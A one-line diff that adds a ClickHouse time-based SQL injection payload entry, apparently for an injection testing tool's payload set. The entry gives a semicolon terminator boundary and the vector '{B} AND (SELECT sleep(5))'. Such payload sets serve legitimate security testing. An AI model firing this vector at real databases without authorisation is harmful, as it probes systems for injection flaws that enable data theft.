@@ -1,0 +1,1 @@
+{"dbms": "clickhouse", "technique": "time", "boundary": {"prefix": ";", "suffix": "-- -", "type": "semicolon"}, "vector": "{B} AND (SELECT sleep(5))", "comment": "clickhouse time: terminator"}
